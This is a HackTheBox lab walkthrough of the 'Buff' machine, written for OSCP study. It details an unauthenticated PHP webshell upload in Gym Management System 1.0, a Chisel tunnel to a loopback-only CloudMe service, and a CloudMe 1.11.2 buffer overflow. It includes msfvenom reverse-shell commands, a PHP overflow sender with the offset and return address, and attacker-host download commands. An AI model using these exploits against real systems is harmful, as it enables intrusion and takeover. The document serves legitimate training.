---
tags: [HTB, Buff, Windows, GymManagement, CloudMe, BufferOverflow, Chisel, Easy]
platform: HackTheBox
os: Windows 10 Enterprise x64
hostname: BUFF
domain: WORKGROUP
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Buff, Full Walkthrough

## The gist

Buff is a standalone Windows 10 host running Gym Management System 1.0 on
Apache/PHP. The upload handler accepts a double-extension image upload and
places the middle extension on disk, giving an unauthenticated PHP webshell.

The first shell runs as shaun. Local enumeration shows CloudMe 1.11.2 listening
only on loopback TCP/8888. Chisel forwards that service to Kali. The public
CloudMe proof of concept uses a 1052-byte offset and a PUSH ESP; RET address in
Qt5Core.dll. A direct PHP socket sender is the reliable delivery method here:
the normal PowerShell/executable wrapper reached the service but did not return
a shell, while the PHP sender returned a command shell as the local
Administrator account.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows 10 Enterprise x64 |
| Hostname | BUFF |
| Domain | WORKGROUP |
| Difficulty | Easy |
| IP | $BoxIP |
| Web service | Apache 2.4.43, PHP 7.4.6 |
| Internal service | CloudMe 1.11.2 on TCP/8888 |

## Variables

~~~bash
boxset BoxName Buff
boxset BoxIP 10.129.25.107
boxset LocalIP $LocalIP
boxset BoxDir /tmp/Buff
boxset PlatformDir /home/kali/Platforms/HackTheBox/Buff
boxset WebPort 8080
boxset InternalPort 8888
boxset ChiselPort 8001
boxset Username shaun
boxset AdminUser administrator
boxset ExploitPort 8888
boxset ListenPort 4444
~~~

## 1. Workspace setup

The helper creates the standard workspace and captures the terminal transcript.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
~~~

The canonical autonomous workspace is $BoxDir: it contains the transcript, loot,
scans, exploit adaptations, payloads, and temporary tooling. $PlatformDir is the
manual/platform archive location; its supplied Buff.log and numbered screenshots
were copied into the vault alongside this write-up.

## 2. Full TCP scan

I scanned every TCP port first. Only TCP/8080 was exposed in the clean scan.
A later targeted check also reported TCP/7680, but it was not required for the
attack path.

~~~bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oN nmap/allports.txt
~~~

TCP/8080 was open and identified as an HTTP proxy by the service database. The
service scan was the important next step.

![[buff-1-nmap-allports.png]]

SCREENSHOT: Capture the complete scan with TCP/8080 visible.

## 3. Service and version scan

~~~bash
sudo nmap -Pn -n -sT -sC -sV -p 8080 $BoxIP -oA nmap/services
~~~

The web service was Apache 2.4.43 on Windows with OpenSSL 1.1.1g and PHP 7.4.6.
The title was mrb3n's Bro Hut.

![[buff-2-nmap-services.png]]

SCREENSHOT: Red box the Apache/PHP versions and the page title.

## 4. Web enumeration

~~~bash
curl -s http://$BoxIP:$WebPort/ | tee loot/index.html
gobuster dir -u http://$BoxIP:$WebPort/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,bak,zip -t 40 -o nmap/gobuster.txt
~~~

The root page exposed the normal gym pages and a login form. Gobuster found
upload.php, the upload directory, include/, profile/, phpMyAdmin (403), and
several ordinary PHP pages. The contact page disclosed the application name.

~~~bash
curl -s http://$BoxIP:$WebPort/contact.php | \
  grep -i 'gym\|manage\|system\|software\|built\|powered'
~~~

The response identified Gym Management Software 1.0.

![[buff-3-gym-fingerprint.png]]

SCREENSHOT: Capture the application fingerprint from contact.php.

## 5. Search for a public exploit

~~~bash
searchsploit "Gym Management System"
searchsploit -m 48506
~~~

Exploit-DB 48506 is an unauthenticated remote-code-execution proof of concept.
The upload handler takes an id parameter, checks the final filename extension
and multipart Content-Type, then uses the middle filename extension when it
constructs the destination filename.

For a filename such as kaio-ken.php.png:

- png satisfies the final-extension allow-list
- image/png satisfies the multipart Content-Type check
- php becomes the server-side extension
- the file is written under the upload directory as a PHP file

## 6. Upload the PHP webshell

The public PoC sends a PNG magic-byte prefix followed by a PHP shell that calls
shell_exec with the telepathy GET parameter. Its upload request is
unauthenticated.

~~~bash
python2 $BoxDir/exploits/48506.py http://$BoxIP:$WebPort/
~~~

The webshell landed at:

~~~text
http://$BoxIP:$WebPort/upload/kamehameha.php
~~~

The returned shell was in C:/xampp/htdocs/gym/upload and executed as shaun.

![[buff-4-webshell.png]]

SCREENSHOT: Red box the successful webshell connection and working directory.

## 7. Confirm the foothold

~~~cmd
whoami
hostname
systeminfo
whoami /all
~~~

The shell was buff\shaun on BUFF. The host was Windows 10 Enterprise build
17134, x64, standalone, and the token had medium integrity. The account was
only a member of the local Users group and had no immediately useful
administrator privileges.

## 8. Enumerate internal services

~~~cmd
ipconfig /all
netstat -ano
tasklist /v
wmic process get ProcessId,Name,CommandLine /format:list
~~~

The important listeners were:

| Address | Service | Significance |
|---|---|---|
| 0.0.0.0:8080 | Apache/PHP | Initial foothold |
| 127.0.0.1:3306 | MySQL | Local database, not needed |
| 127.0.0.1:8888 | CloudMe | Internal privilege-escalation target |

tasklist confirmed CloudMe.exe. Because the service was bound to loopback, it
was not reachable directly from Kali.

![[buff-5-loopback-services.png]]

SCREENSHOT: Red box the MySQL and CloudMe loopback listeners.

![[buff-6-cloudme-process.png]]

SCREENSHOT: Red box CloudMe.exe in the process list.

## 9. Recover and inspect the CloudMe installer

The installer was present in shaun's Downloads directory as
C:/Users/shaun/Downloads/CloudMe_1112.exe. I copied it temporarily into the
existing web upload directory, downloaded it to loot, and removed the remote
copy immediately afterward.

~~~cmd
copy C:/Users/shaun/Downloads/CloudMe_1112.exe C:/xampp/htdocs/gym/upload/CloudMe_1112.exe
~~~

~~~bash
curl -f http://$BoxIP:$WebPort/upload/CloudMe_1112.exe \
  -o loot/CloudMe_1112.exe
7z x -y loot/CloudMe_1112.exe -oloot/cloudme_installer
file loot/cloudme_installer/CloudMe.exe
~~~

The installer was a 32-bit NSIS executable. The extracted CloudMe.exe was a
32-bit PE executable, matching the x86 CloudMe buffer-overflow exploit even
though the operating system itself was x64.

## 10. Forward TCP/8888 through Chisel

I staged a Windows Chisel client through the webshell and ran the Chisel server
on Kali in reverse mode. The reverse remote exposes a Kali-side port and
connects to loopback TCP/8888 as seen from BUFF.

~~~bash
chisel server -p $ChiselPort --reverse
~~~

~~~powershell
iwr http://$LocalIP:80/chisel.exe -OutFile C:/Users/Public/chisel.exe
Start-Process -WindowStyle Hidden -FilePath C:/Users/Public/chisel.exe -ArgumentList 'client $LocalIP:$ChiselPort R:8888:127.0.0.1:8888'
~~~

The server confirmed the remote mapping, and Kali could connect to
127.0.0.1:8888.

~~~bash
nmap -sT -sV -Pn -n -p 8888 127.0.0.1
nc -nv -w 5 127.0.0.1 8888
~~~

![[buff-7-chisel.png]]

SCREENSHOT: Red box the Chisel client connection and R:8888 mapping.

## 11. Search for and review the CloudMe PoC

~~~bash
searchsploit "CloudMe 1.11.2"
searchsploit -m 48389
~~~

EDB-48389 is a simple TCP buffer overflow proof of concept. Its important
assumptions are:

- the target is 127.0.0.1:8888
- 1052 bytes reach the saved return address
- 0x68A842B5 in Qt5Core.dll is PUSH ESP; RET
- 30 NOP bytes provide landing space before shellcode
- the complete buffer is 1500 bytes
- the payload must be x86 because CloudMe.exe is a 32-bit process

The local exploit runner preserved those packet assumptions while loading
shellcode from a separate file.

## 11a. Understand the BOF packet

The exploit is easier to troubleshoot when the 1500-byte packet is treated as
five deliberate regions rather than one magic string:

| Region | Size | Purpose |
|---|---:|---|
| Padding | 1052 bytes | Fills the vulnerable stack buffer up to the saved return address |
| EIP overwrite | 4 bytes | Replaces the saved return address with 0x68A842B5 |
| NOP sled | 30 bytes | Gives the redirected instruction pointer a forgiving landing zone |
| Shellcode | variable | Runs the x86 reverse TCP payload |
| C padding | remainder | Keeps the complete packet at exactly 1500 bytes |

The return address is written little-endian. The integer 0x68A842B5 therefore
appears in the packet as the bytes B5 42 A8 68. The address points to
PUSH ESP; RET inside the Qt5Core.dll loaded by CloudMe. That gadget redirects
execution to the stack, where the NOP sled and shellcode follow immediately.

This is why each value matters:

- Changing 1052 moves the overwrite away from the saved EIP.
- Using a 64-bit address or payload is wrong because CloudMe.exe is 32-bit.
- Omitting the NOP sled makes a small landing difference fatal.
- Sending fewer than 1500 bytes changes the layout expected by the PoC.
- Adding a bad character can truncate the input before EIP or corrupt the
  shellcode.

The normal development sequence for a new BOF is fuzzing, crash confirmation,
offset discovery, bad-character testing, gadget selection, benign code
execution, and finally reverse-shell shellcode. Buff is a shortcut through
that discovery work because EDB-48389 already supplies the researched offset
and gadget; the useful exercise is understanding and preserving the layout.

## 12. Generate x86 shellcode

~~~bash
msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$ListenPort EXITFUNC=thread \
  -b "\x00\x0a\x0d" -f raw \
  -o $BoxDir/exploits/buff_shellcode.bin
~~~

msfvenom is used only as the payload generator. The overflow buffer is still
assembled and sent by the standalone runner.

The important payload options are:

- -a x86: generate instructions for the vulnerable process architecture
- windows/shell_reverse_tcp: use a stageless callback with no second-stage
  download requirement
- EXITFUNC=thread: let the payload exit its thread cleanly where possible
- -b: avoid bytes that the application or protocol may terminate or alter
- -f raw: emit shellcode bytes for the runner, not a Windows executable

## 13. Test the standalone runner

Start the listener before sending the buffer:

~~~bash
nc -lvnp $ListenPort
python3 $BoxDir/exploits/buff_cloudme_48389_runner.py \
  127.0.0.1 8888 $BoxDir/exploits/buff_shellcode.bin
~~~

The 1500-byte buffer reached CloudMe and caused the process to restart. That
was useful evidence that the offset and return address were reaching the
service, but the first shellcode delivery path did not return a callback. A
harmless ping payload produced the same service restart and no ICMP callback.

The target was not considered unreachable: the webshell could still confirm
that CloudMe had restarted and was again listening on 8888. The remaining
problem was payload delivery and process context.

> [!warning] 💡 Hint
> A CloudMe crash after a correctly sized 1500-byte buffer is evidence that the
> overwrite path is active. Keep the listener running, confirm the service has
> restarted, and change one delivery variable at a time.

## 14. Deliver the buffer directly from PHP

The reliable route was to upload a second PHP file that built the buffer in
memory and called fsockopen on 127.0.0.1:8888. The shellcode was split into
base64 chunks rather than embedded as one contiguous raw shellcode literal.
This avoided the PowerShell/executable wrapper that had reached the service but
failed to return a shell.

For the successful retry, I generated a fresh x86 payload with an encoder and
used it in the same fixed packet. Encoding changes the representation of the
shellcode, not the CloudMe offset, gadget, architecture, or total packet
length:

~~~bash
msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$ListenPort EXITFUNC=thread \
  -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 5 -f raw \
  -o $BoxDir/exploits/buff_shellcode_i5.bin
~~~

The payload structure was:

~~~php
<?php
$chunks = array("BASE64_CHUNK_1", "BASE64_CHUNK_2", "...");
$buf = str_repeat(chr(0x90), 1052);
$buf .= pack("V", 0x68A842B5);
$buf .= str_repeat(chr(0x90), 30);
foreach ($chunks as $chunk) {
    $buf .= base64_decode($chunk);
}
$buf .= str_repeat("C", max(0, 1500 - strlen($buf)));
$fp = fsockopen("127.0.0.1", 8888, $errno, $errstr, 5);
if ($fp) {
    fwrite($fp, $buf);
    fflush($fp);
    fclose($fp);
}
?>
~~~

Upload and trigger it:

~~~bash
curl -s -F "file=@$BoxDir/exploits/snd.php;filename=snd.php.png;type=image/png" \
  -F "pupload=upload" \
  "http://$BoxIP:$WebPort/upload.php?id=snd"
curl -s "http://$BoxIP:$WebPort/upload/snd.php"
~~~

The listener received a Windows command shell. The shell was high-integrity
buff\administrator, confirming that CloudMe was running in a privileged
session.

![[buff-8-admin-shell.png]]

SCREENSHOT: Red box the Administrator callback and Windows command prompt.

## 15. Collect the flags privately

The proof files were copied to the webroot only long enough to retrieve them
into the private loot directory. Their values are intentionally omitted here.

~~~cmd
copy C:/Users/shaun/Desktop/user.txt C:/xampp/htdocs/gym/upload/user-proof.txt
copy C:/Users/Administrator/Desktop/root.txt C:/xampp/htdocs/gym/upload/root-proof.txt
~~~

The local copies are:

~~~text
/home/kali/Platforms/HackTheBox/Buff/loot/flags.txt
/tmp/Buff/loot/user.txt
/tmp/Buff/loot/root.txt
~~~

Do not print flag values in the walkthrough or in a shared terminal transcript.

## 16. Clean down

All files created during exploitation were removed from the target. The
CloudMe service itself was left running normally.

~~~cmd
del /F /Q C:/Users/Public/shell.exe
del /F /Q C:/Users/Public/chisel.exe
del /F /Q C:/xampp/htdocs/gym/upload/snd.php
del /F /Q C:/xampp/htdocs/gym/upload/kamehameha.php
del /F /Q C:/xampp/htdocs/gym/upload/user-proof.txt
del /F /Q C:/xampp/htdocs/gym/upload/root-proof.txt
taskkill /F /IM chisel.exe
~~~

I verified that each temporary file was absent. The local HTTP server, Chisel
server, and reverse-shell listeners were also stopped. The original installer
copy was removed before the final collection.

## Credentials

| Account | Source | Use |
|---|---|---|
| shaun | Gym Management System PHP webshell | Initial shell |
| administrator | CloudMe buffer-overflow callback | Final shell |

Passwords and flag values are intentionally omitted.

## Key lessons

- Scan all ports, but remember that a service bound to 127.0.0.1 will only
  appear after shell-level enumeration.
- A double extension can be more than a filter bypass: if the handler uses the
  middle extension when naming the file, it can become direct PHP execution.
- Confirm the architecture of the vulnerable process, not only the OS. Buff is
  x64, but CloudMe.exe is x86.
- A service restart after a BOF is useful evidence when the listener was ready
  and the process comes back on the same port.
- Chisel's single-service reverse mapping is enough when a public exploit
  hardcodes 127.0.0.1:8888.
- If an executable or PowerShell wrapper reaches the service but does not
  return a callback, deliver the same buffer from a simpler target-side
  process. Here, PHP fsockopen succeeded.
- Keep the 1052-byte offset, PUSH ESP; RET address, 30-byte NOP sled, and
  1500-byte total length aligned with the public PoC.
- Remove uploaded shells, copied tools, proof-file staging copies, and tunnel
  processes before closing the run.

## Checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] Apache/PHP service identified
- [x] Gym Management System 1.0 fingerprinted
- [x] EDB-48506 reviewed
- [x] Unauthenticated PHP webshell received
- [x] Shaun foothold confirmed
- [x] Internal CloudMe listener identified
- [x] CloudMe installer downloaded and extracted
- [x] Chisel loopback forward confirmed
- [x] EDB-48389 reviewed
- [x] x86 shellcode generated
- [x] CloudMe overflow offset and return path tested
- [x] Direct PHP socket delivery returned Administrator shell
- [x] User and root proof files stored privately
- [x] Target and Kali cleanup verified

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Windows - Service Scan]] -- identified Apache/PHP and the exposed web port
- [[RUNBOOK V2/Windows - Web Enum]] -- enumerated the application and upload handler
- [[RUNBOOK V2/Windows - Web - Gym Management Upload]] -- bypassed the upload checks and landed the PHP webshell
- [[RUNBOOK V2/Windows - Exploit Search]] -- matched Gym Management System and CloudMe to public PoCs
- [[RUNBOOK V2/Windows - Shell Received]] -- confirmed the shaun and Administrator shells
- [[RUNBOOK V2/Windows - Privilege Triage]] -- confirmed medium-integrity shaun and high-integrity Administrator
- [[RUNBOOK V2/Windows - Port Forwarding]] -- exposed loopback CloudMe through Chisel
- [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] -- adapted and delivered the 32-bit stack overflow
- [[RUNBOOK V2/Windows - Clean Down]] -- removed target-side tooling and uploads

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- another Windows stack buffer overflow with x86 shellcode
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- Windows web foothold and direct privileged service context
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- internal service access through a shell and port forwarding

## External Resources

- [Exploit-DB 48506](https://www.exploit-db.com/exploits/48506)
- [Exploit-DB 48389](https://www.exploit-db.com/exploits/48389)
- [CloudMe 1.11.2 download](https://www.cloudme.com/downloads/CloudMe_1112.exe)
- [Chisel](https://github.com/jpillora/chisel)
- [ippsec.rocks: Buff](https://ippsec.rocks/?q=Buff)

## Why this matters for OSCP

This page combines four exam-relevant habits: identify an upload handler from
source behaviour, confirm architecture before using a buffer-overflow PoC,
forward a loopback-only service, and preserve a working exploit while changing
only the delivery mechanism.

## Attack Chain

1. [[RUNBOOK V2/Windows - Service Scan]] and [[RUNBOOK V2/Windows - Web Enum]]
   identified Apache/PHP on TCP/8080 and Gym Management System 1.0.
2. [[RUNBOOK V2/Windows - Web - Gym Management Upload]] used the
   unauthenticated double-extension upload to execute PHP as shaun.
3. [[RUNBOOK V2/Windows - Port Forwarding]] exposed CloudMe's loopback
   TCP/8888 service to Kali.
4. [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] used the x86
   stack overflow to obtain the Administrator shell.

## Flags

- user.txt: $UserFlag (keep the value private)
- root.txt: $RootFlag (keep the value private)

## Lessons Learned

- The first working primitive was not the final shell. PHP command execution
  was enough to become a pivot and a direct TCP payload sender.
- A public PoC can be correct even when its default payload delivery fails.
  Preserve the tested offset and gadget, then isolate the callback path.
- Internal services should be enumerated from every foothold, including
  loopback listeners that a perimeter scan cannot see.
- Direct PHP socket delivery is a useful fallback when PowerShell or dropped
  executables are blocked or unstable.
